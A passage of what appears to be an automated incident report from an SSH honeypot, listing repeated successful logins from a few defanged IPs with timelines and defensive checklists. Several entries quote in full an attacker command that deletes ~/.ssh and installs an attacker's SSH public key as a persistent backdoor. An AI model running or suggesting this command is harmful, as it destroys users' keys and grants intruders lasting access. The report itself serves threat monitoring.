| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:46:13` | `cowrie.session.connect` |
| `2026-04-19 06:46:13` | `cowrie.client.version` |
| `2026-04-19 06:46:13` | `cowrie.client.kex` |
| `2026-04-19 06:46:13` | `cowrie.login.success` |
| `2026-04-19 06:46:14` | `cowrie.session.params` |
| `2026-04-19 06:46:14` | `cowrie.command.input` |
| `2026-04-19 06:46:14` | `cowrie.command.failed` |
| `2026-04-19 06:46:14` | `cowrie.log.closed` |
| `2026-04-19 06:46:14` | `cowrie.session.params` |
| `2026-04-19 06:46:14` | `cowrie.command.input` |
| `2026-04-19 06:46:14` | `cowrie.session.file_download` |
| `2026-04-19 06:46:14` | `cowrie.log.closed` |
| `2026-04-19 06:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3792acc58d

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:46 |
| **Last Seen** | 2026-04-19 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:46:17` | `cowrie.session.connect` |
| `2026-04-19 06:46:17` | `cowrie.client.version` |
| `2026-04-19 06:46:17` | `cowrie.client.kex` |
| `2026-04-19 06:46:17` | `cowrie.login.success` |
| `2026-04-19 06:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65bc8e89a427

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:46 |
| **Last Seen** | 2026-04-19 06:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:46:43` | `cowrie.session.connect` |
| `2026-04-19 06:46:43` | `cowrie.client.version` |
| `2026-04-19 06:46:43` | `cowrie.client.kex` |
| `2026-04-19 06:46:44` | `cowrie.login.success` |
| `2026-04-19 06:46:44` | `cowrie.session.params` |
| `2026-04-19 06:46:44` | `cowrie.command.input` |
| `2026-04-19 06:46:44` | `cowrie.command.failed` |
| `2026-04-19 06:46:45` | `cowrie.log.closed` |
| `2026-04-19 06:46:45` | `cowrie.session.params` |
| `2026-04-19 06:46:45` | `cowrie.command.input` |
| `2026-04-19 06:46:46` | `cowrie.session.file_download` |
| `2026-04-19 06:46:46` | `cowrie.log.closed` |
| `2026-04-19 06:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dac372b9f58

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:46 |
| **Last Seen** | 2026-04-19 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:46:48` | `cowrie.session.connect` |
| `2026-04-19 06:46:48` | `cowrie.client.version` |
| `2026-04-19 06:46:49` | `cowrie.client.kex` |
| `2026-04-19 06:46:49` | `cowrie.login.success` |
| `2026-04-19 06:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88003e4683e4

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:46 |
| **Last Seen** | 2026-04-19 06:51 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:46:58` | `cowrie.session.connect` |
| `2026-04-19 06:46:58` | `cowrie.client.version` |
| `2026-04-19 06:46:58` | `cowrie.client.kex` |
| `2026-04-19 06:46:59` | `cowrie.login.success` |
| `2026-04-19 06:47:00` | `cowrie.session.params` |
| `2026-04-19 06:47:00` | `cowrie.command.input` |
| `2026-04-19 06:47:00` | `cowrie.command.failed` |
| `2026-04-19 06:47:00` | `cowrie.log.closed` |
| `2026-04-19 06:47:01` | `cowrie.session.params` |
| `2026-04-19 06:47:01` | `cowrie.command.input` |
| `2026-04-19 06:47:02` | `cowrie.session.file_download` |
| `2026-04-19 06:47:02` | `cowrie.log.closed` |
| `2026-04-19 06:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd343f5ee79

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:47 |
| **Last Seen** | 2026-04-19 06:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:47:05` | `cowrie.session.connect` |
| `2026-04-19 06:47:05` | `cowrie.client.version` |
| `2026-04-19 06:47:06` | `cowrie.client.kex` |
| `2026-04-19 06:47:07` | `cowrie.login.success` |
| `2026-04-19 06:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca21e75fe4c

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:47 |
| **Last Seen** | 2026-04-19 06:52 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:47:49` | `cowrie.session.connect` |
| `2026-04-19 06:47:49` | `cowrie.client.version` |
| `2026-04-19 06:47:49` | `cowrie.client.kex` |
| `2026-04-19 06:47:50` | `cowrie.login.success` |
| `2026-04-19 06:47:51` | `cowrie.session.params` |
| `2026-04-19 06:47:51` | `cowrie.command.input` |
| `2026-04-19 06:47:51` | `cowrie.command.failed` |
| `2026-04-19 06:47:51` | `cowrie.log.closed` |
| `2026-04-19 06:47:52` | `cowrie.session.params` |
| `2026-04-19 06:47:52` | `cowrie.command.input` |
| `2026-04-19 06:47:52` | `cowrie.session.file_download` |
| `2026-04-19 06:47:52` | `cowrie.log.closed` |
| `2026-04-19 06:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44fa363153b7

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:47 |
| **Last Seen** | 2026-04-19 06:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:47:56` | `cowrie.session.connect` |
| `2026-04-19 06:47:56` | `cowrie.client.version` |
| `2026-04-19 06:47:56` | `cowrie.client.kex` |
| `2026-04-19 06:47:58` | `cowrie.login.success` |
| `2026-04-19 06:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e49b18855efe

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:48 |
| **Last Seen** | 2026-04-19 06:53 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:48:36` | `cowrie.session.connect` |
| `2026-04-19 06:48:36` | `cowrie.client.version` |
| `2026-04-19 06:48:36` | `cowrie.client.kex` |
| `2026-04-19 06:48:38` | `cowrie.login.success` |
| `2026-04-19 06:48:39` | `cowrie.session.params` |
| `2026-04-19 06:48:39` | `cowrie.command.input` |
| `2026-04-19 06:48:39` | `cowrie.command.failed` |
| `2026-04-19 06:48:39` | `cowrie.log.closed` |
| `2026-04-19 06:48:40` | `cowrie.session.params` |
| `2026-04-19 06:48:40` | `cowrie.command.input` |
| `2026-04-19 06:48:40` | `cowrie.session.file_download` |
| `2026-04-19 06:48:40` | `cowrie.log.closed` |
| `2026-04-19 06:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56d0ac19e38

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:48 |
| **Last Seen** | 2026-04-19 06:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:48:44` | `cowrie.session.connect` |
| `2026-04-19 06:48:44` | `cowrie.client.version` |
| `2026-04-19 06:48:44` | `cowrie.client.kex` |
| `2026-04-19 06:48:45` | `cowrie.login.success` |
| `2026-04-19 06:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54498c3ca49d

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:48 |
| **Last Seen** | 2026-04-19 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:48:51` | `cowrie.session.connect` |
| `2026-04-19 06:48:51` | `cowrie.client.version` |
| `2026-04-19 06:48:51` | `cowrie.client.kex` |
| `2026-04-19 06:48:51` | `cowrie.login.success` |
| `2026-04-19 06:48:52` | `cowrie.session.params` |
| `2026-04-19 06:48:52` | `cowrie.command.input` |
| `2026-04-19 06:48:52` | `cowrie.command.failed` |
| `2026-04-19 06:48:52` | `cowrie.log.closed` |
| `2026-04-19 06:48:52` | `cowrie.session.params` |
| `2026-04-19 06:48:52` | `cowrie.command.input` |
| `2026-04-19 06:48:52` | `cowrie.session.file_download` |
| `2026-04-19 06:48:52` | `cowrie.log.closed` |
| `2026-04-19 06:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4ba9c2ceb5

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:48 |
| **Last Seen** | 2026-04-19 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:48:55` | `cowrie.session.connect` |
| `2026-04-19 06:48:55` | `cowrie.client.version` |
| `2026-04-19 06:48:55` | `cowrie.client.kex` |
| `2026-04-19 06:48:55` | `cowrie.login.success` |
| `2026-04-19 06:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ad0525cff45

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:50 |
| **Last Seen** | 2026-04-19 06:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:50:11` | `cowrie.session.connect` |
| `2026-04-19 06:50:11` | `cowrie.client.version` |
| `2026-04-19 06:50:11` | `cowrie.client.kex` |
| `2026-04-19 06:50:12` | `cowrie.login.success` |
| `2026-04-19 06:50:12` | `cowrie.session.params` |
| `2026-04-19 06:50:12` | `cowrie.command.input` |
| `2026-04-19 06:50:12` | `cowrie.command.failed` |
| `2026-04-19 06:50:12` | `cowrie.log.closed` |
| `2026-04-19 06:50:13` | `cowrie.session.params` |
| `2026-04-19 06:50:13` | `cowrie.command.input` |
| `2026-04-19 06:50:13` | `cowrie.session.file_download` |
| `2026-04-19 06:50:13` | `cowrie.log.closed` |
| `2026-04-19 06:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718c8c804944

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:50 |
| **Last Seen** | 2026-04-19 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:50:16` | `cowrie.session.connect` |
| `2026-04-19 06:50:16` | `cowrie.client.version` |
| `2026-04-19 06:50:16` | `cowrie.client.kex` |
| `2026-04-19 06:50:17` | `cowrie.login.success` |
| `2026-04-19 06:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31edbad7cb5d

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:50 |
| **Last Seen** | 2026-04-19 06:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:50:32` | `cowrie.session.connect` |
| `2026-04-19 06:50:32` | `cowrie.client.version` |
| `2026-04-19 06:50:32` | `cowrie.client.kex` |
| `2026-04-19 06:50:33` | `cowrie.login.success` |
| `2026-04-19 06:50:33` | `cowrie.session.params` |
| `2026-04-19 06:50:33` | `cowrie.command.input` |
| `2026-04-19 06:50:33` | `cowrie.command.failed` |
| `2026-04-19 06:50:33` | `cowrie.log.closed` |
| `2026-04-19 06:50:34` | `cowrie.session.params` |
| `2026-04-19 06:50:34` | `cowrie.command.input` |
| `2026-04-19 06:50:34` | `cowrie.session.file_download` |
| `2026-04-19 06:50:34` | `cowrie.log.closed` |
| `2026-04-19 06:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba71f2f4a93

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:50 |
| **Last Seen** | 2026-04-19 06:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:50:36` | `cowrie.session.connect` |
| `2026-04-19 06:50:36` | `cowrie.client.version` |
| `2026-04-19 06:50:36` | `cowrie.client.kex` |
| `2026-04-19 06:50:37` | `cowrie.login.success` |
| `2026-04-19 06:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eef5bca96cdf

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:51 |
| **Last Seen** | 2026-04-19 06:56 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:51:00` | `cowrie.session.connect` |
| `2026-04-19 06:51:00` | `cowrie.client.version` |
| `2026-04-19 06:51:00` | `cowrie.client.kex` |
| `2026-04-19 06:51:02` | `cowrie.login.success` |
| `2026-04-19 06:51:02` | `cowrie.session.params` |
| `2026-04-19 06:51:02` | `cowrie.command.input` |
